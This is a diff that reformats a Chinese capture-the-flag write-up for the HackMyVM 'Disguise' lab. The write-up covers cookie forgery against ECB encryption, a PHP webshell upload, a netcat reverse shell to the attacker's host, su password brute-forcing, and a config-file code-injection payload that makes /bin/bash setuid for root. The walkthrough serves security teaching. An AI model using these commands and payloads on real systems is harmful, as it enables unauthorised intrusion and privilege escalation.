@@ -1,13 +1,13 @@
-### 一、信息收集与初步探测
+# 一、信息收集与初步探测
 
-#### 1.1 主机发现
+## 1.1 主机发现
 
 渗透测试的第一步通常是发现网络中的存活主机。这里我们使用`arp-scan`工具对本地网络进行扫描。
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/hgfs/gx]
-└─$ sudo arp-scan -l                   
-[sudo] password for kali: 
+└─$ sudo arp-scan -l
+[sudo] password for kali:
 Interface: eth0, type: EN10MB, MAC: 00:0c:29:af:40:3a, IPv4: 192.168.205.206
 Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
@@ -19,9 +19,9 @@ Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 Ending arp-scan 1.10.0: 256 hosts scanned in 2.028 seconds (126.23 hosts/sec). 4 responded
 ```
 
-扫描结果显示，IP地址为 `192.168.205.211` 的主机响应了ARP请求，其MAC地址为 `08:00:27:ea:d3:f5`，厂商信息为 `PCS Systemtechnik GmbH` (通常与Oracle VirtualBox相关)。该IP将作为我们后续渗透的目标。
+扫描结果显示，IP地址为 `192.168.205.211` 的主机响应了ARP请求，其MAC地址为 `08:00:27:ea:d3:f5`。该IP将作为我们后续渗透的目标。
 
-#### 1.2 端口扫描
+## 1.2 端口扫描
 
 确定目标主机后，使用`nmap`进行端口扫描，以识别目标主机开放的服务。
 
@@ -42,9 +42,9 @@ Nmap done: 1 IP address (1 host up) scanned in 1.20 seconds
 
 Nmap扫描结果表明，目标主机开放了 TCP 22端口 (SSH服务) 和 TCP 80端口 (HTTP服务)。
 
-### 二、Web应用渗透测试
+# 二、Web应用渗透测试
 
-#### 2.1 域名解析与站点识别
+## 2.1 域名解析与站点识别
 
 直接通过IP地址访问目标主机的HTTP服务 (端口80)，发现网页内容提示需要解析域名。
 ![image-20250516095849516](https://7r1UMPH.top/image/20250516095856656.webp)
@@ -54,7 +54,7 @@ Nmap扫描结果表明，目标主机开放了 TCP 22端口 (SSH服务) 和 TCP 
 ```bash
 ┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ echo "192.168.205.211 http://disguise.hmv" | sudo tee -a /etc/hosts > /dev/null
-                                                                                                                                                                                   
+
 ┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ tail -n 1 /etc/hosts
 192.168.205.211 http://disguise.hmv
@@ -63,9 +63,9 @@ Nmap扫描结果表明，目标主机开放了 TCP 22端口 (SSH服务) 和 TCP 
 配置完成后，通过域名 `http://disguise.hmv` 访问站点。观察页面页脚信息，初步判断该站点是基于WordPress构建的。
 ![image-20250516100842676](https://7r1UMPH.top/image/20250516100842781.webp)
 
-#### 2.2 WordPress漏洞扫描与信息收集
+## 2.2 WordPress漏洞扫描与信息收集
 
-##### 2.2.1 Nuclei扫描
+### 2.2.1 Nuclei扫描
 
 首先尝试使用`nuclei`对目标WordPress站点进行自动化漏洞扫描。
 
@@ -96,7 +96,7 @@ Nmap扫描结果表明，目标主机开放了 TCP 22端口 (SSH服务) 和 TCP 
 
 Nuclei扫描未发现明显漏洞。接下来使用更专业的WordPress扫描工具`wpscan`。
 
-##### 2.2.2 WPScan扫描
+### 2.2.2 WPScan扫描
 
 执行`wpscan`对站点进行详细枚举，包括用户、主题、插件等。
 
@@ -113,7 +113,7 @@ _______________________________________________________________
 
          WordPress Security Scanner by the WPScan Team
                          Version 3.8.28
-                               
+
        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
 _______________________________________________________________
 
@@ -373,7 +373,7 @@ WPScan扫描结果的关键信息：
     *   `CVE-2025-1304`: NewsBlogger < 0.2.5.2 - Authenticated (Subscriber+) Arbitrary File Upload. （这个看起来更有利用价值）
 *   发现用户 `simpleadmin` (以及 `simpleAdmin`，可能为同一用户)。
 
-#### 2.3 密码爆破尝试 (WordPress & SSH)
+## 2.3 密码爆破尝试 (WordPress & SSH)
 
 基于发现的用户 `simpleadmin`，尝试对其WordPress后台密码进行爆破。
 
@@ -391,7 +391,7 @@ WPScan扫描结果的关键信息：
 
 经过约10分钟的等待，两个爆破均未成功，判断密码爆破的路径可能行不通。
 
-#### 2.4 Web目录爆破
+## 2.4 Web目录爆破
 
 尝试使用`gobuster`对`http://disguise.hmv`进行目录爆破，以发现可能存在的隐藏页面或资源。
 
@@ -450,9 +450,9 @@ Finished
 
 目录爆破运行约2分钟后，发现扫描速度非常缓慢，推测WordPress站点可能存在WAF或其他防护机制。决定暂停扫描，寻找其他突破口。
 
-### 三、网络层面信息发掘
+# 三、网络层面信息发掘
 
-#### 3.1 IPv6探测
+## 3.1 IPv6探测
 
 尝试从IPv6层面进行探测。
 
@@ -522,7 +522,7 @@ Nmap done: 1 IP address (1 host up) scanned in 6.59 seconds
 
 IPv6扫描结果与IPv4一致，开放SSH (OpenSSH 7.9p1) 和 HTTP (Apache 2.4.59) 服务。
 
-#### 3.2 流量监听
+## 3.2 流量监听
 
 使用`tcpdump`监听目标主机 `192.168.205.211` 的网络流量，观察是否有异常通信。
 
@@ -545,9 +545,9 @@ listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
 
 经过约1分钟的监听，捕获到的主要是NTP和ARP报文，未发现有价值的信息。
 
-### 四、子域名爆破与关键发现
+# 四、子域名爆破与关键发现
 
-#### 4.1 FFUF子域名爆破 (初试)
+## 4.1 FFUF子域名爆破 (初试)
 
 将注意力转回Web层面，尝试进行子域名爆破。使用`ffuf`工具，通过修改Host头的方式进行探测。
 
@@ -555,12 +555,12 @@ listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
 ┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ ffuf -u http://disguise.hmv/ -H 'Host: FUZZ.disguise.hmv' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 -fw 11916
 
-        /'___\  /'___\           /'___\       
-       /\ \__/ /\ \__/  __  __  /\ \__/       
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
-         \ \_\   \ \_\  \ \____/  \ \_\       
-          \/_/    \/_/   \/___/    \/_/       
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
 
        v2.1.0-dev
 ________________________________________________
@@ -585,8 +585,8 @@ www                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 404
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/hgfs/gx]
-└─$ sudo nano /etc/hosts                             
-                                                                                                                                                                                   
+└─$ sudo nano /etc/hosts
+
 ┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ cat /etc/hosts
 127.0.0.1       localhost
@@ -613,7 +613,7 @@ Content-Type: text/html; charset=UTF-8
 
 该子域名通过301重定向到主站 `http://disguise.hmv/`，没有提供新的攻击面。
 
-#### 4.2 Gobuster DNS模式子域名爆破
+## 4.2 Gobuster DNS模式子域名爆破
 
 考虑到`ffuf`扫描速度也较慢，尝试使用`gobuster`的DNS模式进行子域名爆破，首先使用大字典。
 
@@ -693,13 +693,13 @@ Finished
 
 蛙趣，不对啊，2w多都没出来这么夸张？看看其他人的wp。操.......好像是软件问题。
 
-#### 4.3 Wfuzz子域名爆破 (转机)
+## 4.3 Wfuzz子域名爆破 (转机)
 
 更换为`wfuzz`工具，同样通过修改Host头的方式进行子域名爆破。
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/hgfs/gx]
-└─$ wfuzz -c -u "http://disguise.hmv/" -H "HOST:FUZZ.disguise.hmv" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 4602 
+└─$ wfuzz -c -u "http://disguise.hmv/" -H "HOST:FUZZ.disguise.hmv" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 4602
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
@@ -709,11 +709,11 @@ Target: http://disguise.hmv/
 Total requests: 114441
 
 =====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                                                                           
+ID           Response   Lines    Word       Chars       Payload
 =====================================================================
 
-000000001:   301        0 L      0 W        0 Ch        "www - www"                                                                                                       
-000005051:   200        18 L     52 W       846 Ch      "dark - dark"                                                                                                     
+000000001:   301        0 L      0 W        0 Ch        "www - www"
+000005051:   200        18 L     52 W       846 Ch      "dark - dark"
 ^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...
 
 Total time: 236.0730
@@ -722,17 +722,19 @@ Filtered Requests: 8492
 Requests/sec.: 35.98038
 ```
 
-`wfuzz`成功爆破出新的子域名 `dark.disguise.hmv`！沉默是今晚的康桥。
+`wfuzz`成功爆破出新的子域名 `dark.disguise.hmv`！
+
+沉默是今晚的康桥。
 
 将新发现的子域名 `dark.disguise.hmv` 添加到 `/etc/hosts` 文件。
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/hgfs/gx]
-└─$ sudo nano /etc/hosts                             
-[sudo] password for kali: 
-                                                                                                                                                                                   
+└─$ sudo nano /etc/hosts
+[sudo] password for kali:
+
 ┌──(kali㉿kali)-[/mnt/hgfs/gx]
-└─$ cat /etc/hosts                 
+└─$ cat /etc/hosts
 127.0.0.1       localhost
 127.0.1.1       kali
 ::1             localhost ip6-localhost ip6-loopback
@@ -746,9 +748,9 @@ ff02::2         ip6-allrouters
 ![image-20250516110839064](https://7r1UMPH.top/image/20250516110839497.webp)
 页面显示为一个名为“暗黑商店”的站点，风格有点炫。
 
-### 五、暗黑商店 (dark.disguise.hmv) 渗透测试
+# 五、暗黑商店 (dark.disguise.hmv) 渗透测试
 
-#### 5.1 初步探索与注册功能分析
+## 5.1 初步探索与注册功能分析
 
 查看新站点的页面源码，未发现明显可利用信息。尝试使用之前在WordPress站点发现的用户名 `simpleAdmin` 进行弱密码登录，失败。
 观察注册页面 (register.php)，发现其表单提交时存在前端JavaScript校验函数 `validateForm`，该函数限制用户名长度不能超过8个字符。
@@ -781,17 +783,17 @@ function validateForm() {
     <header>
         <h1>暗黑商店</h1>
         <nav>
-            <span>欢迎, admin 
-            </span> | 
-            <a href="index.php">首页</a> | 
+            <span>欢迎, admin
+            </span> |
+            <a href="index.php">首页</a> |
                         <a href="logout.php">退出</a>
         </nav>
     </header>
-    
+
     <div class="profile">
         <h2>个人中心</h2>
         <p>欢迎访问您的个人主页，这里可以查看和管理您的账户信息</p>
-        
+
             </div>
 </body>
 </html>
@@ -815,7 +817,7 @@ Priority: u=0, i
 
 这 `dark_session` 看起来有点机会，但目前尚不清楚其具体作用。
 
-#### 5.2 SQL注入与XSS尝试
+## 5.2 SQL注入与XSS尝试
 
 在进一步分析 `dark_session` 前，先尝试常规的Web漏洞测试。
 使用`sqlmap`对登录表单 (login.php) 进行SQL注入检测。
@@ -840,7 +842,7 @@ you have not declared cookie(s), while server wants to set its own ('PHPSESSID=e
 [1/1] Form:
 POST http://dark.disguise.hmv/login.php
 POST data: username=&password=
-do you want to test this form? [Y/n/q] 
+do you want to test this form? [Y/n/q]
 > Y
 Edit POST data [default: username=&password=] (Warning: blank fields detected): username=&password=
 do you want to fill blank fields with random values? [Y/n] Y
@@ -854,7 +856,7 @@ do you want to fill blank fields with random values? [Y/n] Y
 Sqlmap未发现SQL注入漏洞。
 尝试在注册用户名的位置输入XSS payload `<script>alert(document.domain)</script>`，密码 `111111`。登录后发现特殊字符 `<` 和 `>` 被HTML实体编码，XSS尝试失败。
 
-#### 5.3 Cookie (`dark_session`) 分析与伪造 (ECB Oracle Padding Attack)
+## 5.3 Cookie (`dark_session`) 分析与伪造 (ECB Oracle Padding Attack)
 
 重点分析 `dark_session` Cookie。
 以用户 `admin` (密码 `111111`) 登录后获取的 `dark_session` 为 `1mr9fHMuTh6J56IrZHP28w%3D%3D`。
@@ -867,7 +869,7 @@ Sqlmap未发现SQL注入漏洞。
 ```bash
 ┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ echo "1mr9fHMuTh6J56IrZHP28w==" | base64 -d
-�j�|s.N��+ds��                                                                                                                                                                                   
+�j�|s.N��+ds��
 ┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ echo "1mr9fHMuTh6J56IrZHP28w==" | base64 -d | xxd
 00000000: d66a fd7c 732e 4e1e 89e7 a22b 6473 f6f3  .j.|s.N....+ds..
@@ -875,7 +877,7 @@ Sqlmap未发现SQL注入漏洞。
 
 这16字节的乱码很可能是加密后的用户信息。
 
-##### 5.3.1 分析加密模式和块大小
+### 5.3.1 分析加密模式和块大小
 
 为了分析加密细节，注册不同长度的用户名（密码固定为`111111`），观察 `dark_session` 的变化。
 
@@ -890,14 +892,14 @@ Sqlmap未发现SQL注入漏洞。
 
 观察15字节和20字节用户名的密文，它们的前16字节完全相同 (`8952...f3a8`)。这强烈暗示了加密模式为 **ECB (Electronic Codebook)**，且块大小为 **16字节**。
 
-##### 5.3.2 确认密码不参与Cookie加密
+### 5.3.2 确认密码不参与Cookie加密
 
 注册用户 `test2` (5字节)，密码 `1111111111` (与之前的 `111111` 不同)。
 `dark_session=oLEv4TbjA09b0PNNSNRdhA%3D%3D`
 Base64解码后xxd: `a0b1 2fe1 36e3 034f 5bd0 f34d 48d4 5d84` (仍为16字节)。
 密文长度和结构未因密码改变而改变，确认密码不直接参与 `dark_session` 的加密。
 
-##### 5.3.3 推断Salt和填充机制
+### 5.3.3 推断Salt和填充机制
 
 加密的明文结构推测为 `Salt + Username`，然后进行PKCS#7填充。
 
@@ -922,7 +924,7 @@ Base64解码后xxd: `a0b1 2fe1 36e3 034f 5bd0 f34d 48d4 5d84` (仍为16字节)�
 Base64解码后xxd: `8952 2d1f cdb7 b63d b85f 5d46 2fea f3a8 c270 91fa ec39 d4b1 5b5e a96e ccc6 24b6` (32字节)。
 如果Salt为4字节，则 `Salt(4) + adminadminad(12) = 16`字节。根据PKCS#7填充规则，当数据长度等于块大小时，仍需填充一个完整的16字节块 (16个`\x10`)。因此总明文长度为32字节，产生32字节密文。这与观察一致，确认 **Salt长度为4字节**。
 
-##### 5.3.4 伪造simpleAdmin的Cookie
+### 5.3.4 伪造simpleAdmin的Cookie
 
 目标用户 `simpleAdmin` (11字节)。
 服务器实际加密的明文为 `Salt(4) + "simpleAdmin"(11) = 15`字节。
@@ -941,7 +943,7 @@ PKCS#7填充后为 `Salt(4) + "simpleAdmin"(11) + "\x01"(padding)`，共16字节
 
    *注意：登录的时候也要进行和2一样的操作*
 
-3. 注册成功后，浏览器Cookie中的 `dark_session` 值为 %2B1%2B3%2FNxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY%3D`。
+3. 注册成功后，浏览器Cookie中的 `dark_session` 值为 `%2B1%2B3%2FNxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY%3D`。
 
 4. URL解码：`+1+3/NxCLcIR0Jq9qDudF8JwkfrsOdSxW16pbszGJLY=`
 
@@ -970,7 +972,7 @@ PKCS#7填充后为 `Salt(4) + "simpleAdmin"(11) + "\x01"(padding)`，共16字节
    ![image-20250516163748655](https://7r1UMPH.top/image/20250516163749012.webp)
    这波操作，来之不易啊！
 
-### 六、获取WebShell
+# 六、获取WebShell
 
 以`simpleAdmin`身份登录后，进入后台管理页面 (`/manager/index.php`)，发现有添加商品的功能，并且可以上传商品图片。先上传了一个`reverse.php`
 ![image-20250516164155309](https://7r1UMPH.top/image/20250516164155596.webp)
@@ -1054,9 +1056,9 @@ if (isset($_REQUEST['cmd'])) {
 
 命令成功执行，当前用户为 `www-data`。
 
-### 七、权限提升
+# 七、权限提升
 
-#### 7.1 获取反弹Shell
+## 7.1 获取反弹Shell
 
 利用已上传的Webshell获取一个反弹Shell，以便进行更方便的操作。
 在Kali上设置监听：
@@ -1071,7 +1073,6 @@ listening on [any] 8888 ...
 `http://dark.disguise.hmv/images/8d755f95e5203d7d71d93aefa9649514.php?cmd=nc+192.168.205.206+8888+-e+/bin/bash`
 
 ![image-20250516165136706](https://7r1UMPH.top/image/20250516165136907.webp)
-
 
 成功接收到反弹Shell。
 
@@ -1090,18 +1091,18 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 script /dev/null -c bash
 # 按 Ctrl+Z 将其置于后台
 stty raw -echo; fg
-reset xterm  
-export TERM=xterm  
-export SHELL=/bin/bash  
+reset xterm
+export TERM=xterm
+export SHELL=/bin/bash
 stty rows 24 columns 80
 ```
 
-#### 7.2 信息收集 (www-data 用户)
+## 7.2 信息收集 (www-data 用户)
 
 在 `/var/www/dark/` 目录下找到 `config.php`。
 
 ```bash
-www-data@disguise:/var/www/dark$ cat config.php 
+www-data@disguise:/var/www/dark$ cat config.php
 <?php
 
 $DB_USER = 'dark_db_admin';
@@ -1115,8 +1116,8 @@ $DB_NAME = 'dark_shop';
 登录数据库查看用户信息。
 
 ```bash
-www-data@disguise:/var/www/dark$ mysql -u dark_db_admin -p 
-Enter password: 
+www-data@disguise:/var/www/dark$ mysql -u dark_db_admin -p
+Enter password:
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
 Your MariaDB connection id is 78045
 Server version: 10.3.39-MariaDB-0+deb10u2 Debian 10
@@ -1174,7 +1175,7 @@ drwxr-xr-x  4 darksoul darksoul 4096 Apr  2 04:19 darksoul
 在 `/home/darksoul/` 目录下发现 `config.ini`，内容和 `/var/www/dark/config.php` 中的数据库密码一致。
 
 ```bash
-www-data@disguise:/home/darksoul$ cat config.ini 
+www-data@disguise:/home/darksoul$ cat config.ini
 [client]
 user = dark_db_admin
 password = Str0ngPassw0d1***
@@ -1195,14 +1196,14 @@ Crunch will now generate the following amount of data: 1556068 bytes
 0 GB
 0 TB
 0 PB
-Crunch will now generate the following number of lines: 389017 
+Crunch will now generate the following number of lines: 389017
 ┌──(kali㉿kali)-[/mnt/hgfs/gx]
-└─$ cat pass | wc -l                                                               389017      
+└─$ cat pass | wc -l                                                               389017
 ┌──(kali㉿kali)-[/mnt/hgfs/gx]
-└─$ tac pass | sponge pass                                                           
+└─$ tac pass | sponge pass
 ┌──(kali㉿kali)-[/mnt/hgfs/gx]
-└─$ cat pass | wc -l      
-389017        
+└─$ cat pass | wc -l
+389017
 ┌──(kali㉿kali)-[/mnt/hgfs/gx]
 └─$ head -n 10 pass
 Str0ngPassw0d1)))
@@ -1222,11 +1223,11 @@ www-data@disguise:/tmp$ wget 192.168.205.206/suForce
 www-data@disguise:/tmp$ wget 192.168.205.206/pass
 www-data@disguise:/tmp$ chmod +x suForce
 www-data@disguise:/tmp$ ./suForce -u darksoul -w pass
-            _____                          
- ___ _   _ |  ___|__  _ __ ___ ___   
-/ __| | | || |_ / _ \| '__/ __/ _ \ 
-\__ \ |_| ||  _| (_) | | | (_|  __/  
-|___/\__,_||_|  \___/|_|  \___\___|  
+            _____
+ ___ _   _ |  ___|__  _ __ ___ ___
+/ __| | | || |_ / _ \| '__/ __/ _ \
+\__ \ |_| ||  _| (_) | | | (_|  __/
+|___/\__,_||_|  \___/|_|  \___\___|
 ───────────────────────────────────
  code: d4t4s3c     version: v1.0.0
 ───────────────────────────────────
@@ -1242,7 +1243,7 @@ www-data@disguise:/tmp$ ./suForce -u darksoul -w pass
 
 ```bash
 www-data@disguise:/tmp$ su darksoul
-Password: 
+Password:
 darksoul@disguise:/tmp$ id
 uid=1000(darksoul) gid=1000(darksoul) groups=1000(darksoul)
 ```
@@ -1263,7 +1264,7 @@ drwx------ 3 darksoul darksoul 4096 Apr  1 10:03 .gnupg
 drwxr-xr-x 3 darksoul darksoul 4096 Apr  1 10:04 .local
 -rw-r--r-- 1 darksoul darksoul  807 Mar 31 11:19 .profile
 -rw------- 1 darksoul darksoul   68 Apr  2 04:22 user.txt
-darksoul@disguise:~$ cat user.txt 
+darksoul@disguise:~$ cat user.txt
 Good good study & Day day up,but where is the flag?
 darksoul@disguise:~$ grep -r -i 'HMV{' / 2>/dev/null
 /home/darksoul/user.txt:hmv{hiddenflag}
@@ -1274,8 +1275,8 @@ darksoul@disguise:~$ grep -r -i 'HMV{' / 2>/dev/null
 用`xxd`也能看到。
 
 ```bash
-darksoul@disguise:~$ xxd user.txt 
-00000000: 476f 6f64 2067 6f6f 6420 7374 7564 7920  Good good study 
+darksoul@disguise:~$ xxd user.txt
+00000000: 476f 6f64 2067 6f6f 6420 7374 7564 7920  Good good study
 00000010: 2620 4461 7920 6461 7920 7570 2c62 7574  & Day day up,but
 00000020: 2077 6865 7265 2069 7320 7468 6520 666c   where is the fl
 00000030: 6167 3f0a 686d 767b 6869 6464 656e 666c  ag?.hmv{hiddenfl
@@ -1284,17 +1285,17 @@ darksoul@disguise:~$ xxd user.txt
 
 获取第一个flag: `hmv{hiddenflag}`。
 
-#### 7.3 darksoul -> root 提权
+## 7.3 darksoul -> root 提权
 
 使用`pspy64`监控进程。
 
 ```bash
 darksoul@disguise:/tmp$ wget 192.168.205.206/pspy64
-darksoul@disguise:/tmp$ chmod +x pspy64 
-darksoul@disguise:/tmp$ ./pspy64 
+darksoul@disguise:/tmp$ chmod +x pspy64
+darksoul@disguise:/tmp$ ./pspy64
 # ... (pspy64 输出) ...
-2025/05/16 06:51:01 CMD: UID=0     PID=16089  | /bin/sh -c /usr/bin/python3 /opt/query.py /home/darksoul/config.ini > /home/darksoul/darkshopcount 
-2025/05/16 06:51:02 CMD: UID=0     PID=16090  | /usr/bin/python3 /opt/query.py /home/darksoul/config.ini 
+2025/05/16 06:51:01 CMD: UID=0     PID=16089  | /bin/sh -c /usr/bin/python3 /opt/query.py /home/darksoul/config.ini > /home/darksoul/darkshopcount
+2025/05/16 06:51:02 CMD: UID=0     PID=16090  | /usr/bin/python3 /opt/query.py /home/darksoul/config.ini
 # ... (pspy64 输出) ...
 ```
 
@@ -1356,7 +1357,7 @@ darksoul@disguise:~$ ls -la config.ini
 -rw-r--r-- 1 darksoul darksoul 0 May 16 06:57 config.ini
 ```
 
-查了一下 `mysql-connector-python` 的 `read_default_file`，发现存在一个可以通过配置文件执行任意代码的漏洞例如 CVE-2023-22084。信息收集的终点是wx公众号（滑稽）。
+查了一下 `mysql-connector-python` 的 `read_default_file`，google找不到，[wx公众号](https://mp.weixin.qq.com/s/h3qOUrzhANfDJ0PuAJyc6w) 找到了。信息收集的终点是wx公众号（滑稽）。
 ![image-20250516191958461](https://7r1UMPH.top/image/20250516191958785.webp)
 
 构造恶意的 `config.ini`：
@@ -1377,7 +1378,7 @@ allow_local_infile=__import__('os').system('chmod u+s /bin/bash')
 
 ```bash
 # pspy64 输出中会看到
-2025/05/16 07:19:01 CMD: UID=0     PID=16589  | sh -c chmod u+s /bin/bash 
+2025/05/16 07:19:01 CMD: UID=0     PID=16589  | sh -c chmod u+s /bin/bash
 ```
 
 检查 `/bin/bash` 权限。
@@ -1393,13 +1394,13 @@ darksoul@disguise:~$ ls -la /bin/bash
 darksoul@disguise:~$ bash -p
 bash-5.0# id
 uid=1000(darksoul) gid=1000(darksoul) euid=0(root) groups=1000(darksoul)
-bash-5.0# cat /root/root.txt 
+bash-5.0# cat /root/root.txt
 #Congratulations!!!
 hmv{CVE-2025-21548}
 ```
 
 成功获取root权限并读取 `/root/root.txt` 中的flag: `hmv{CVE-2025-21548}`。
 
-### 八、总结
+# 八、总结
 
 本次Disguise靶机的渗透过程涉及了Web应用层面的信息收集、漏洞扫描、子域名爆破，以及针对ECB加密模式下Cookie的巧妙伪造。后续通过对系统内部文件和进程的分析，发现了数据库凭证泄露和cron定时任务的配置不当，最终结合Python库的特性实现了权限提升至root。整个过程环环相扣，充分展现了信息收集和漏洞利用的重要性。
